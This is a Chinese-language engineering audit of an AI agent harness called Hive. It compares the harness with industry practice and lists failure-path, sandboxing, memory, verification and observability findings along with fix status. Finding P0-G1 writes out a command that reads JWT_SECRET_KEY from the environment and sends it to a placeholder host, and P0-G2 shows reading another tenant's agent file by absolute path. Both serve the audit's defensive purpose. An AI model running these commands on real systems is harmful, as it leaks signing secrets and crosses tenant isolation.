# Hive Harness 工程全面审计 — 2026-06-11

> **范围**:以 Anthropic / OpenAI / 社区三方的 Harness 工程定义与实践为基准,对 Hive 全工程(内核循环、上下文工程、行动治理、记忆与自进化、长任务持久执行、可观测与评估)做控制元素级对照审计。
> **方法**:3 路外部基准研究(全部一手来源,URL 在附录 B)+ 6 路内部分区审计(全部断言带 file:line,生产接线核实优先于代码存在性)+ 主审对每个分区最高严重度 P0 亲读代码复核。本文已在 2026-06-12 按当前 HEAD 做校准性复核,但仍建议每个 P0 修复前按 §11 重新执行命令确认。
> **基线**:原审计草稿基于 main @ 3cade6ef(RLS stage-2c 后);本版校准到 main @ aac4044a(`fix frontend auth 401 messaging`)。3cade6ef 之后已包含 RLS stage-3 role flip、URL normalization、role DDL cast、background backfill、frontend auth 401 messaging 等修复,因此 RLS 相关文字按「事故复盘 + 当前待验项」表达,不把旧快照当当前事实。
> **与 06-09 审计的关系**:上次总判「内核真/边缘假/地基洞」,其 6 phase 修复已验证仍在线(compaction P0-P2、T-G1/G2/G3.1、治理链等逐项复核通过)。本次审计在更深的 harness 维度发现新的一层,与上次不重复。

---

## 0. 一句话总判

**单个器官对标到位、局部超越 CC;但 harness 工程的另一半——失败路径与跨器官闭环——系统性缺位。**

Hive 今天是一台**晴天机器**:每个部件(循环、压缩、治理、记忆、journal、队列)都认真对标了 CC 的晴天形态,其中 LoopGuard 三通道、transient reminder、extract queue、workflow journal 甚至超出 CC。但三方基准一致指出 harness 价值的另一半在雨天:CC 约四成循环代码在处理「出错之后怎么活下来」(10 次退避重试、tombstone、输出 cap escalate、中断接续);OpenAI / LangGraph 体系把 durable execution、trace、human review、state checkpoint 作为运行时基本面;社区长任务实践 TOP1 是「状态外置 + 重放即恢复」。这一半在 Hive 仍明显不足:**HTTP 层 provider overload/rate-limit 一击毙命、撞输出 cap 静默断尾、进程重启误杀全部 in-flight workflow、协调信号总线两头死线、30 秒默认超时掐死一切长工具**。

同时浮现本仓库病根「绿测试≠完成」的全景版:**至少 11 处 built-but-unwired / built-but-fake 死线**(详见 §7),其中进化闭环的「验证门」实质是同义反复+LLM 自评——这比没有门更危险,因为它向 owner 发出虚假的「已验证」信号。

三大北极星现状:**①基础框架对齐 CC——晴天面 ~85% 对齐+局部净超越,雨天面系统性缺位,综合「结构对齐、韧性未对齐」;②记忆+自进化超越 CC——基础设施层(治理/纯净/可逆/审计)真超越,体感层(学习时延/读侧智能/技能修补)反而落后于 CC 与 hermes,且唯一的「已超越」证据(bakeoff)是字符串存在性检查,不可采信;③企业级管控——治理链与权限模型合格,但执行隔离(env 密钥透传+无 OS 沙箱)与资源管控(预算 enforcement 是死代码)两个地基洞使 Goal-2 当前仍不成立。RLS role-flip 已暴露过 pre-auth 401 事故;后续提交修了部分显性故障,但仍需按当前 HEAD 重跑生产级验收,不能仅凭提交存在性宣称完成。**

多数 P0 是收敛性修复(过滤一行、统一一个 gateway、补一张 timeout 表、接通一个消费者),但 sandbox/code-mode、trace spine、quota enforcement、RLS 二次验收、thinking 签名链属于系统性工程,不能压成「小补丁」。修完这些闭环后三大北极星才有资格进入达成验收。

---

## 1. 基准:三方对 Harness 的定义与控制元素

### 1.1 三方定义(各取核心)

**Anthropic**(无一句式定义,操作性三层):harness = 围绕 agent loop(gather context → take action → verify work → repeat)的脚手架,提供工具、上下文管理、权限框架、subagent、hooks;长程场景下 harness = 跨上下文窗口工作的基础设施;且「**harness 中的每个组件都编码了一个关于模型做不到什么的假设**」——模型变强,组件应删。边界:思考归模型,行动边界归 harness。

**OpenAI**(两层定义,2026-02 两篇 Codex 文章):结构上 harness = 「the agent loop and logic that underlies all Codex experiences」,四部分 = 核心循环 + Thread 生命周期与持久化(create/resume/fork/archive)+ Config/Auth + 沙箱内工具执行与统一策略模型;职能上「**Humans steer. Agents execute.**」——工程师的工作变成 design environments, specify intent, build feedback loops。关键趋势:OpenAI 持续把智能面(compaction、planning)下沉进模型权重,harness 剩下**治理面**——与 Hive 的 L1/L2 分层同向。

**社区**(共识公式):`Agent = Model + Harness`,「如果你不是模型,你就是 harness」。Fowler 站分法:**Guides(前馈:AGENTS.md、架构文档)+ Sensors(反馈:linter、测试、review)**。thin vs thick 之争的可操作落点(Osmani 综合派):harness 不会变薄只会迁移,**每个组件必须标注它补偿的模型缺陷,缺陷消失即删**——与 Hive AI-Native L1 同构。

### 1.2 关键基准参数(审计中实际使用的尺子)

| 控制域 | 基准尺子(出处见附录 B) |
|---|---|
| 失败路径 | CC `withRetry`:默认 10 次、指数退避 500ms→32s+jitter、尊重 retry-after 头、529 三连切 fallback model、无人值守模式可无限重试;输出 cap:64K escalate → 3 次 resume 续写才暴露错误 |
| 上下文经济 | CC token 计量 canonical = 最后一条 assistant 的真实 API usage + 增量估算;Manus:KV-cache 命中率 =「生产 agent 第一指标」(cached $0.30 vs uncached $3/MTok);压缩必须可恢复(留指针)而非有损丢弃 |
| 沙箱 | Codex 默认态 OS 级 fail-closed(Seatbelt/seccomp+默认断网,审批是「脱沙箱」例外通道);CC sandbox 弹窗削减 84%;社区多租户基线上移到 microVM(E2B Firecracker 独立内核) |
| 持久执行 | Temporal:每次 LLM/工具调用 = activity 持久化,崩溃后从最后完成步恢复且**不重复已执行的外部动作**;LangGraph:每 super-step 检查点;OpenHands:append-only 事件溯源「重放即重建」 |
| 编排 | CC subagent 摘要回传 1,000-2,000 tokens 契约;Agent Teams 共享任务表+mailbox;委托契约四要素(objective/output format/工具指引/boundaries);Cognition:默认单线程,并行只接可独立验证分片 |
| 可观测 | OpenAI Agents SDK tracing 默认开:Trace→Span(generation/function/guardrail/handoff)全链 trace_id 贯通;企业控制面五件套 = 身份、生命周期、权限、预算、审计,且「动作发生点强制 + append-only」 |
| 验证收敛 | Anthropic:独立 evaluator 苛刻打分、任一项低于硬阈值即回炉;社区:「外部验证判停,禁止自评完成」(Ralph loop 的 Generator/Judge 分离) |
| 记忆 | CC auto memory:MEMORY.md 索引(200 行/25KB 上限)+ 回合末 forked agent LLM 提取直写 + Sonnet manifest 选择器动态 recall;hermes:回合末 fork 完整 LLM agent 判断「该学什么」、第一优先动作 = patch 当前已加载技能、记忆工具含 replace/remove |

---

## 2. 九域对照总表

| # | 控制域 | 对齐状态 | 一句话 |
|---|---|---|---|
| 1 | 循环控制 | 🟡 骨架对齐+局部超越,雨天路径仍需硬化 | 200 轮+压力提醒+LoopGuard 三通道超出 CC;输出 cap 续跑、mid-run steering、流中断 tombstone 已补;重试矩阵与工具级可中断性仍是主缺口 |
| 2 | 上下文控制 | 🟡 压缩主干对齐,三个机制级误读出血 | compaction P0-P2 在线且恢复语境分层优于 CC;cache boundary 语义误读+字符估算无真实锚+microcompact 温 cache 挖洞 |
| 3 | 行动治理 | 🟢 链路完整 fail-closed / 🔴 执行隔离缺位 | 治理链无绕过、权限粒度企业合格;但 run_command/execute_code 无沙箱+env 全透传 |
| 4 | 任务编排 | 🟡 原语齐全,主要执行断点已接通 | subagent/workflow/plan/trigger 全有且对标过;完成回流、once ack、restart resume、IM durable run wrapper、工具分段并行、取消穿透已补;仍需继续清理上下文/治理类 P2 |
| 5 | 状态持久化 | 🟡 器官真实,重启恢复主线已接通 | workflow journal/extract queue 教科书级;web-chat active run resume、long-task resume context、once inflight ack、IM channel run 持久化已补;仍需继续清理其它零调用死线 |
| 6 | 记忆 | 🟢 治理面真超越 / 🟡 体感面仍需量化 | 写门/生命周期/审计/SOP 质量碾压 CC 与 hermes;T2 高权重、skill patch、update/retire、activation metadata、PPR 主检索已接;剩余差距在 LLM 主路化与 live baseline |
| 7 | 自进化 | 🟡 闭环最后一跳已接多条,仍需外部基准证据 | candidate/ledger/manifest 结构对;真验证门、fast_reflection LLM 化、DREAM 裁决、repeated-feedback frozen gate 已补;Hermes live CLI 仍未复跑 |
| 8 | 可观测 | 🟡 审计型强,运维型正在补齐 | 合规审计四表+hash 链铺得密;invocation trace、token usage、Prometheus metrics、hook failure、prompt cache、CI eval、health/liveness 已接;结构化 daemon trace 仍待补 |
| 9 | 人机协作 | 🟡 审批主链已回流,模型仍可统一 | 审批接线+飞书卡;approval 批准结果已回写原 web-chat run;Checkpoint 与 ApprovalRequest 仍需长期统一 |

---

## 3. P0 发现(15 条,按主题组织)

### 3.1 失败路径工程(「雨天裸奔」)— 5 条

**P0-K1 HTTP status 错误无有效重试,429/529 一击毙命,且客户端「HTTPStatusError 重试分支」是死代码**(主审已亲核)
- 现状:`OpenAICompatibleClient.stream` 对 HTTP≥400 直接 `raise LLMError`(`llm_client.py:629-633`);下方 429 退避分支(:685-697)捕获 `httpx.HTTPStatusError`,但该 status 路径没有 `raise_for_status()` —— **该分支不可达**。网络连接/读取异常仍有 3 次 retry,所以问题不是「所有瞬态错误零重试」,而是 HTTP 429/529/5xx 这条最关键的 provider overload/rate-limit 路径没有有效 retry matrix。内核层无同模型退避重试;429/529/quota/auth 被 `classify_llm_error` 标为 `requires_user_decision` 后**连 fallback model 都被禁止**(`engine.py:2074-2077`)。语义与 CC 恰好反转:CC 在 529 上强制 fallback,Hive 在 529 上禁止一切自动恢复。
- 基准:CC `withRetry` 默认 10 次、指数退避+jitter、尊重 `retry-after`/`anthropic-ratelimit-unified-reset` 头、529 三连切 fallback、无人值守 persistent-retry 模式。
- 影响:一次 HTTP 层 overload / rate-limit 即可杀死 web chat run / trigger / heartbeat。这是「企业级无人值守数字员工」与 CC 基线之间最大的可靠性断层。
- 修复:客户端层补 withRetry 等价物(分类驱动:429/529/5xx/连接/超时可重试,quota/auth/404 不可重试);「须用户决策」收窄为「禁换模型但允许同模型重试」;daemon 源加 persistent 模式;删死代码。
- 整改状态(2026-06-12):已接入 `llm_client._post_with_status_retries()` 与 streaming status retry;覆盖 OpenAI-compatible complete/stream、OpenAI Responses complete、Gemini complete/stream、Anthropic complete/stream 的 408/409/425/429/5xx/529 status 重试。证据见 §12.1。

**P0-K2 Anthropic 原生 thinking 多轮签名链断裂——内核丢签名、客户端伪造 `"synthetic_signature"`**(主审已亲核)
- 现状:assistant 回合写回历史只带 `reasoning_content`,丢弃 `reasoning_signature`(`engine.py:2272-2279`);`to_anthropic_format` 回放时 `"signature": self.reasoning_signature or "synthetic_signature"` **伪造签名**(`llm_client.py:73-78`);无 interleaved-thinking beta 头。
- 基准:CC thinking 三法则(`query.ts:151-163`):签名 model-bound,fallback 时 `stripSignatureBlocks` 剥除——宁剥不伪造。
- 影响:**基准模型家族(Claude)在 Hive agent loop 里多轮 thinking 实际不可用**(伪造签名 → API 400 → 按 P0-K1 链路杀 run)。同时违反 L1(削弱模型思考)与 L3(Claude 被劣化 = 模型不平等)。
- 修复:补签名透传;无签名时不发 thinking block(对齐 CC);序列化链补字段。
- 整改状态(2026-06-12):已删除 synthetic signature 行为;`LLMMessage.to_anthropic_format()` 只有在 `reasoning_signature` 存在时才发 thinking block,无签名时保留 text 内容并省略 thinking。证据见 §12.1。

**P0-D1 startup 孤儿 reconciler 无差别击杀 workflow 的跨进程恢复**(主审已亲核)
- 修复:reconciler 加 `task_type != "workflow"` 过滤(workflow 孤儿判定交给 daemon 的 lease)。**一行级修复,价值极大。**
- 整改状态(2026-06-12):已在 DB 查询和循环内双层排除 `task_type == "workflow"`;workflow run 不再被 startup orphan sweep 标 failed。证据见 §12.1。

**P0-D2 协调 Signal 写/读 split-brain:父唤醒与 workflow 完成通知在默认配置下双死线**
- 现状:`COORDINATION_BACKEND` 默认 `"memory"`(`config.py:169`)。写侧落进程内 singleton(`coordination.py:251`),workflow 完成信号更是硬编码写内存(`workflow_runtime_service.py:944-961`);而 daemon 消费方 `drain_subagent_completion_wakes`/`drain_signal_resumes` **只读 PG 表**;in-run 消费方又硬编码读内存。两种配置各死一条线;`workflow_completed` 信号**生产零消费方**。这是 [[绿测试≠完成]] 的又一实例(测试注入绕过生产接线)。
- 修复:生产与消费统一经 `pick_gateway`;`_emit_completion_signal` 改走 gateway;startup 加配置一致性断言。
- 整改状态(2026-06-12):workflow completion signal 写侧已从硬编码 `coordination_runtime` 改为 `gateway_scope(tenant_id=...)`;memory backend 仍落 in-process gateway,postgres backend 会落 `CoordinationRepository`。完成后主动回流/通知仍归 P1-10,不由本条冒充。证据见 §12.2。

- 现状:`ToolRuntimeService.execute` 对所有工具 `asyncio.wait_for(timeout=_TOOL_TIMEOUTS.get(tool_name, 30.0))`(`tools/service.py:304-330`),三个长工具都不在覆盖表;`spawn_subagent` 同步等子代理整跑完(工具面无 background 参数,`run_in_background` 能力存在但不可达);子代理单轮 LLM call 的 httpx timeout 就有 120s。**subagent 源能力实际无法承载任何非平凡同步任务**(只有 <30s 的短任务才活,这正是它「看似可用」的原因)。结构性矛盾:工具层 timeout < 单次 LLM call timeout。
- 修复:ToolMeta 加 timeout 字段或长任务白名单升分钟级;spawn_subagent 暴露 run_in_background;同步 DR 路由到后台。

### 3.2 执行隔离与资源管控(Goal-2 地基)— 2 条 + RLS 现状

**P0-G1 代码/Shell 执行把全平台密钥透传给 agent,跨租户全线击穿**
- 现状:`_prepare_execution_environment` 用 `safe_env = dict(os.environ)` 只覆盖 HOME 等两项(`code_exec.py:101`),子进程能读 `JWT_SECRET_KEY`/`SECRETS_MASTER_KEY`/`DATABASE_URL` 及所有 API key。黑名单不拦 `python3/node`;一条 `run_command("python3 -c 'import os,urllib.request; urllib.request.urlopen(\"http://x/\"+os.environ[\"JWT_SECRET_KEY\"])')` 同时绕开两层。`JWT_SECRET_KEY` 泄漏 = 伪造任意租户 token;`SECRETS_MASTER_KEY` 泄漏 = 解密所有租户落库 secret。
- 基准:CC seatbelt/bubblewrap + env 白名单;Codex 默认沙箱不继承宿主 secret。
- 修复:子进程 env 改显式白名单(PATH/HOME/LANG + 显式注入项),剔除一切 `*_KEY/*_SECRET/DATABASE_URL/*_TOKEN`;长期上 OS 沙箱(见 G2)。
- 整改状态(2026-06-12):已新增 `services/subprocess_env.py` 统一白名单环境,并接入 `execute_code`、`run_command`、HR skills install、live bakeoff subprocess。`backend/app` 已无 `dict(os.environ)` / `safe_env = dict(os.environ)` 执行子进程路径。OS 级隔离仍由 P0-G2 跟踪。证据见 §12.1。

**P0-G2 无 OS 级沙箱;共享容器内 run_command 可越权读其他 agent/租户工作区**
- 现状:`asyncio.create_subprocess_exec` + `cwd=workspace/`,无 chroot/namespace/seccomp;路径防护只拦字面量 `"../../"`(`code_exec.py:85-92`)。`cat /data/agents/<other_agent_id>/soul.md`(绝对路径零 `..`)不被拦。**RLS 只保护 Postgres 行,不保护文件系统**;文件层工具的 `startswith(ws.resolve())` 校验在 shell 路径被彻底绕过。配套问题 P1-G5:execute_code 工具描述宣称「No network access」实际只是可绕过的字符串黑名单——L2 法律违例(harness 约束是摆设,security theater)。
- 基准:Codex OS 级 fail-closed 默认态;社区多租户基线 = microVM(E2B Firecracker)/gVisor(Modal)。
- 修复:短期 mount-namespace+只读绑定挂载到单一 agent 目录(Linux bwrap 可用);中期评估执行类工具整体外置到隔离服务;同步修正工具描述失实宣称。
- 整改状态(2026-06-12):`execute_code` / `run_command` 已统一走 OS sandbox wrapper。Linux 优先 `bwrap` mount namespace,只绑定当前 workspace/HOME 并只读绑定系统运行时目录;macOS 使用 `sandbox-exec` 禁 network 并拒绝 `/Users` 下非 workspace/HOME 访问。没有 runner 时默认 fail-closed;只有显式 `HIVE_ALLOW_UNSANDBOXED_CODE_EXEC=1` 才允许本地开发降级。证据见 §12.8。中期 microVM/gVisor 外置执行服务仍可作为更强隔离演进,但当前不再是裸 `create_subprocess_exec`。

**RLS 现状(进行中主线,非新发现,但有新实战教训)**:role-flip 在 2026-06-11 暴露过 pre-auth 登录 401 事故——根因是 login 等 pre-auth 查询无租户上下文时触发 GUC fail-closed。当前 HEAD 已在 3cade6ef 之后追加多次修复(URL normalization、role DDL cast、background backfill、frontend auth 401 messaging),但本审计没有重新连接生产验证「role flip 已完成」。因此本段应作为**事故复盘与二次验收清单**,不是当前生产状态断言。再翻/再验必修:①pre-auth 路径(login/register/SSO/邀请码)走明确审计的 `enter_rls_bypass` 或等价 owner/pre-auth accessor ②验证 `SET LOCAL` 在 handler mid-commit 后不会蒸发 ③flip 后验真实登录+核心 CRUD+跨租户红队,而非只验隔离。本次审计补充两个 RLS 耐久性缺口:**P1-G4 无 CI/AST 守卫拦截新增 bare `async_session()`**(迁完 184 处后无机制防回潮,整个迁移的耐久性依赖一个不存在的守卫);**P2-G10 `enter_rls_bypass` 偏宽**,含治理热路径(governance_resolver 每次工具治理都在 BYPASS 会话里查 Agent)。

### 3.3 进化闭环的诚实性(假门与死线)— 3 条

**P0-M1 「verification→promotion」是装样子:同义反复检查 + LLM 自评晋升**
- 现状:①skill_flywheel 唯一 grader 是 `state_check contains "status: candidate only"`——该字符串是 3 行前模板自己写进去的,**验证恒真**(`skill_flywheel.py:120-130`);②`_run_llm_rubric_check` 不调 LLM,只透传调用方预填的 `passed` 布尔(`evolution_verification.py:114-121`);③`decide_verified_promotion` 零生产调用方;④真正晋升技能的 skill_distiller 先落盘再 `record_eval_run(reward=draft.confidence, passed=True)` 恒过——**晋升门 = LLM 自报 confidence ≥0.85,ledger 是事后记账不是门**。
- 基准:sota-plan 自己的 §8「Do not use LLM self-judgment as the only verifier」;社区「外部验证判停,禁止自评完成」。
- 影响:P3「Verification-gated Promotion Completed」声明实质不成立;给 owner 的「已验证」信号是假的,**比没有门更危险**。
- 修复:distiller 晋升前接真 grader(deterministic:技能 lint+加载烟测,或 human confirmation 经 evolution_view);llm_rubric 透传如实改名或删;flywheel 撤同义反复 grader。
- 整改状态(2026-06-12):已把 `llm_rubric` 改为 fail-closed 非可执行 verifier;新增 `skill_guard` verifier 并接入 `skill_flywheel` 与 `skill_distiller`。`skill_distiller` 晋升顺序已改为 candidate → `skill_guard` verification → verification eval → promotion decision → save,危险草稿不会落盘。证据见 §12.3。后续如果要把 lint/load-smoke/human confirmation 纳入更强 verifier matrix,应作为增强项新增,不能再用 LLM confidence 冒充通过。

**P0-M2 fast_reflection 全链机械化(L1 违例)且终端产物无消费者**
- 现状:信号分类 = 字符串 marker 匹配为主路径(含「不是」/「failed」等中文高频词,`fast_reflection_service.py:18-35`),无 LLM 参与;机械技能草稿曾被错误写成 Skill draft;2026-06-19 已升级为 Skill Candidate Package：机械 fast-reflection/lifecycle 信号写 `candidate_signal.md`，只有 Skill Writer / Distiller LLM 生成的语义草稿才写 `SKILL.md.draft`。
- 基准:hermes 每回合 fork 完整 LLM agent(继承 prompt cache)用高质量 prompt 判断「该学什么」(`background_review.py:34-145`)。
- 修复:分类步换小模型侧查询(与 retriever rerank 同模式),机械 marker 降级为可观测兜底;死草稿目录砍掉或接通消费者。
- 整改状态(2026-06-12, 2026-06-19 路径升级):已把 RESPONSE_COMPLETE hook 接入 tenant summary model classifier,输出 `fast_reflection_classification` 后再进入同步 candidate writer;`fast_reflection_service` 现在只接受 explicit metadata、LLM classification、或结构化 repeated-workflow metadata。marker/regex 兜底已移除；marker-only 文本按 low-signal 处理，不再生成学习候选。`candidate_signal.md` 只作为 evidence 注入 Skill Writer / Distiller prompt；`SKILL.md.draft` 必须由 LLM-authored Skill Candidate Package 产生，不允许平台模板冒充语义草稿。证据见 §12.5。

**P0-M3 DREAM.md 模板死线 + 测试钉死幽灵**
- 现状:`_DREAM_TEMPLATE_PATH` 定义后从未被 read_text(`auto_dream.py:1099`);生产 dream 走 `_AUTO_DREAM_SYSTEM_PROMPT` + `DREAM_CONSOLIDATOR.md`。而 `tests/runtime/test_dream_template.py` 专门钉 DREAM.md 内容、CLAUDE.md 宣称它有效;且模板教 agent 对 memory/ 用 write_file——与运行时铁律相悖,即便活着也走不通。
- 修复:删 DREAM.md+测试,或真接成 dream 的 SOP 入口(类比 heartbeat `_load_heartbeat_instruction`);同步改 CLAUDE.md。
- 整改状态(2026-06-12):选择「真接入」而非删除。`_AUTO_DREAM_SYSTEM_PROMPT` 现在通过 `_load_dream_protocol_instruction()` 读取 `DREAM.md`,但截掉旧 `[DREAM:complete]` worker 输出段,保留当前 JSON-only consolidator 契约;`DREAM.md` 中直接 `write_file/edit_file` 改 `memory/` 的旧指令已改为 Memory Control Plane/internal writeback 语义。证据见 §12.4。

### 3.4 上下文经济(cache 出血)— 2 条

**P0-C1 动态后缀寄生在 system message 内且逐回合变化 → 跨回合历史 cache 全灭(所有 provider)**(主审已亲核)
- 现状:dynamic suffix 拼进 system prompt 字符串(`prompt_builder.py:604-607`),每次 `handle()` 重建;逐回合必变字段:分钟级 UTC 时钟(`environment.py:348`)、秒级 agent 时区时钟(`agent_context.py:141-144`)、memory navigation 热度表的 `recall_count/last_recalled`(每次检索 `bump_access` 自增 → 必变)。CC 的 boundary 分隔的是「跨组织 cache scope vs 会话私有」,**两侧在会话内都字节稳定**;per-turn 动态全部走消息尾部 attachment。Hive 把 boundary 误读成「会话稳定 vs 每回合可变」。
- 影响:长会话里 history 占 token 大头,**每个用户回合全额重读**——Manus 口径下 10 倍成本差;所有 provider 同时出血(L3 语境下更严重)。
- 修复:per-turn 易变内容迁出 system,复用已有 transient 尾部通道(Anthropic 客户端已把尾部 system 降级为 user "[System Notice]",形态现成)。最小切口先迁时钟+热度表。
- 整改状态(2026-06-12):kernel 现在在 API 边界拆开 `PROMPT_CACHE_BOUNDARY`:第一条 system message 只保留 frozen prefix;dynamic suffix(memory/retrieval/navigation/env/source/suffix sections)作为本轮 transient `[System Notice]` user message 追加到 `stream_messages`,不进入 `api_messages` 持久历史。PTL retry 与 tool expansion prompt rebuild 同步使用该拆分。证据见 §12.7。

**P0-C2 压缩触发用纯字符估算(3.3-4.0 cpt,无 CJK 校准),从不用真实 usage → 中文会话被动 PTL 机械降级成为主路径**
- 现状:`current_tokens=estimate_tokens(...)` 字符除以 cpt(`memory_service.py:402`);kernel 每轮拿到 `response.usage` 只用于计费,从不回灌压缩触发。中文 ≈1.5 字符/token,3.5 cpt 低估 ~2.3 倍 → 75%/82% 阈值在真实窗口 ~170% 才满足 = **主动压缩近乎永不触发**,主路径退化为 PTL 反应式,而 PTL attempt 1-2 是机械掉头 20% 轮组(无 LLM 摘要、不触发 PRE_COMPACTION 抽取)——智能步骤的机械处理成为事实主路径,L1 违例。
- 基准:CC `tokenCountWithEstimation` = 最后一条 assistant 的**真实 API usage** + 新增粗估,注释明示 canonical。
- 修复:每轮把 `extract_usage_tokens(response.usage)` 写入会话状态作锚 + 增量估算(照搬 CC);ProviderSpec 给 CJK 部署校准 cpt。配套 P1-C3:microcompact 把 CC 的「会话空闲→cache 必已冷」触发语义误读为「单条结果年龄」,在温 cache 反复挖洞——改为距最后 assistant 消息 gap>60min 判定。
- 整改状态(2026-06-12):已为 `maybe_compress_messages()` 增加 `usage_anchor_tokens`,触发判断取 `max(estimate_tokens, usage_anchor_tokens)`;kernel 在拿到 provider `response.usage` 后刷新 `SessionContext.metadata["usage_anchor_tokens"]`,并在初始压缩、PTL full-compress fallback、mid-loop proactive compaction 三个调用点传入 anchor。证据见 §12.6。CJK cpt 校准和 P1-C3 microcompact gap 语义仍是后续独立项。

### 3.5 运维失明 — 3 条

**P0-O1 per-invocation trace 层不存在:LLM 调用零持久化、kernel 全文无计时**
- 现状:kernel 2800+ 行无任何计时——LLM 单轮延迟从未被测量;轮次数不落任何地方;`RuntimeTask.trace_id` 只在 subagent/delegation 线写,web chat/trigger/heartbeat 主路径不写;`SecurityAuditEvent.request_id` 列存在但 governance 6 处调用全不传。无法回答「这次 invocation 调了几轮、每轮多久、哪个工具慢」。
- 基准:OpenAI Agents SDK tracing 默认开,Trace→Span 全链贯通。
- 修复(最小方案):`invoke_agent()` 入口生成 invocation_id 挂 ContextVar;kernel 经 KernelDependencies 加 `record_span` 回调(与 record_token_usage 同构)发 generation-span/function-span 落一张 append-only `invocation_spans` 表;invocation_id 回填 activity detail/SecurityAuditEvent.request_id/DecisionTrace——审计链四店分裂(P2-O9)自动闭合。不必先上 OTel。
- 整改状态(2026-06-12):已新增 file-backed `invocation_spans.jsonl` trace spine 与 `ContextVar` invocation_id。kernel 每次 `handle()` 写 invocation span,每轮 LLM 写 generation span(含 provider/model/round/tool_call_count/usage/error),统一工具执行入口写 tool span(含 duration/status/result size/error)。`SessionContext.metadata["trace_id"]` 会携带 invocation_id。证据见 §12.9。DB 表/OTel 导出可后续迁移,但当前已不是零持久化/零计时。

**P0-O2 DecisionTraceStore 纯内存 + 反馈→校准环路三级死线**(主审已亲核)
- 现状:内存 dict 挂进程单例(`decision_trace.py:35-38`),重启即失、多 worker 分裂、无租户隔离;`record_feedback` 生产零调用方 → `calibration_candidates()` 永空 → `propose_charter_calibrations_from_feedback` 也无生产调用方。CLAUDE.md 宣称的「owner feedback 链回 decision/<id>」能力在生产不存在。
- 修复:DecisionTrace 落 DB;接通 feedback 写入方或删死链并改 CLAUDE.md。
- 整改状态(2026-06-12):`DecisionTraceStore` 已支持 append-only file-backed persistence,可跨 store/restart 读取 decision 与 feedback;`ToolRuntimeService` 默认使用 `DecisionTraceStore.persistent_default()` 落 `<AGENT_DATA_DIR>/_control_plane/decision_traces.jsonl`。证据见 §12.10。owner feedback 的生产写入 API/UI 仍需接通,但 preflight decision trace 不再是纯进程内存。

**P0-O3 token 计量约 12 条 LLM 旁路不入账,蒸馏烧钱账单不可见**
- 现状:`record_token_usage` 唯一接线点是 kernel;绕过 invoke_agent 直接 create_llm_client 的生产消费方(extract_agent/auto_dream/conversation_summarizer/memory_curation/compaction/session_recall/skill_distiller/retriever rerank/subagent_evolution/subagent_memory/subagent_generator/hr)全部不入账。每个 agent 每次回复触发 T2 提取、2h heartbeat、24h dream——持续后台支出对租户配额与平台账单完全不可见。
- 修复:在 `create_llm_client_from_config` 工厂(06-05 事故后已收敛的单点)统一挂 usage 回调,带 source 标签落账。配套 P1-O8:账本只有 3 个递增计数器,admin 时序图把全部历史用量记到 agent 创建日——**时序图是错误数据**;建 `token_usage_events` 日聚合表。
- 整改状态(2026-06-12):已新增 `token_usage_events` append-only 事件账本,`record_token_usage()` 在保留 Agent/User 聚合计数的同时写事件;`create_llm_client_from_config()` 和 `chat_complete/chat_stream()` 支持 usage-aware config wrapper。当前生产扫描覆盖 12 条自主 LLM 旁路:`extract_agent`、`auto_dream`(含 frozen mission judge)、`conversation_summarizer`/compaction/session summary、`memory_curation`、`session_recall`、`memory_rerank`、`fast_reflection_classifier`、`skill_distiller`、`subagent_generator`、`subagent_evolution`、`subagent_memory`、`hr_soul_refine`。Admin time series 改为按 `token_usage_events.created_at` 聚合,不再用 `Agent.created_at` 代理。证据见 §12.11。

---

## 4. P1 重点(节选 15 条,完整清单见各分区报告)

| # | 发现 | 证据锚点 | 修复方向 |
|---|---|---|---|
| P1-1 | **预算 enforcement 已接入(2026-06-12)**:`invoke_agent()` 入口现在先执行 user token quota admission gate;显式 `request.user_id` 优先,后台运行回落 agent owner/creator。quota denied 或 quota 检查异常都不会进入 kernel。证据见 §12.12 | `runtime/invoker.py` / `quota_guard.py` | 后续可扩展 tenant-level quota,但 user-level token gate 不再是死代码 |
| P1-2 | **运行中 steering 已接入(2026-06-12)**:active web-chat run 下新用户输入会写入 `ChatMessage`,追加到 active `RuntimeTask.metadata_json.pending_user_messages`;kernel 每轮开头 drain 为真实 user message。REST 返回 202 queued,WS 发 `user_message_queued`,不再丢输入。证据见 §12.14 | `web_chat_runtime.py` / `kernel/contracts.py` / `kernel/engine.py` / `api/chat_sessions.py` / `api/websocket.py` | 单次长 streaming final answer 仍只能在下一轮/下一次调用看见 steering;工具轮之间已对齐 CC mid-turn drain |
| P1-3 | **输出 cap continuation 已接入(2026-06-12)**:kernel 现在读取 `finish_reason in {"length","max_tokens"}`,在无 tool_call 时用 assistant partial + resume prompt 续写,最多 3 次,续写 cap 65536;普通工具轮次/PTL fallback/max_output_tokens 回归已覆盖。证据见 §12.13 | `kernel/engine.py` / `tests/kernel/test_engine.py` | 后续可把 continuation attempt 写入 runtime event/trace;不再静默截断最终回答 |
| P1-4 | **旧 T2/understanding prompt lane 已退役(2026-06-19)**:`MemoryRetriever` 不再读取 `memory/learnings/*.md` 或 `understandings.md` 作为 prompt semantic memory；`include_legacy_sources` / `include_derived_sources` 不能把这些兼容面重新注入主 prompt。canonical prompt memory 走 explicit overlay + accepted T3 + episodic recall + generated navigation map。 | `memory/retriever.py` / `memory/t2_store.py` / `memory/understanding_store.py` / `tests/memory/test_retrieval_pipeline.py` / `tests/memory/test_understanding_store.py` | 避免旧 compatibility view、relationship projection 和 Segment Package/T3 双源漂移 |
| P1-5 | **技能 patch 通路已接入并去平台重渲染(2026-06-12, 2026-06-19 收紧)**:`skill_distiller` 的 patch 决策现在进入 `skill_patch` candidate → `skill_guard` verification → eval → promotion decision → exact LLM-authored `SKILL.md.draft` commit,不再停在人工建议,也不再由平台 `_save_skill()` 重组语义正文。证据见 §12.19 | `skill_distiller.py` / `evolution_validation.py` / `tests/services/test_skill_distiller.py` | patch 终态纳入 ledger validator 的 promoted 类终态;仍由 `skill_guard` 和 promotion decision gate 阻断不安全草稿 |
| P1-6 | **错误记忆纠正工具已接入(2026-06-12)**:新增 governed `update_memory`/`retire_memory`;update 通过 write gate 写新 T3,再按 entry_id 退休旧 T3 并记录 supersedes/superseded_by;retire 只归档不物理删除。证据见 §12.20 | `tools/handlers/memory.py` / `memory/t3_store.py` / `memory/lifecycle_store.py` / `capability_gate.py` | 两个工具进入 CORE tool surface 和 `agent.memory.write` 能力门；runtime memory section 与 tool schema 已同步 |
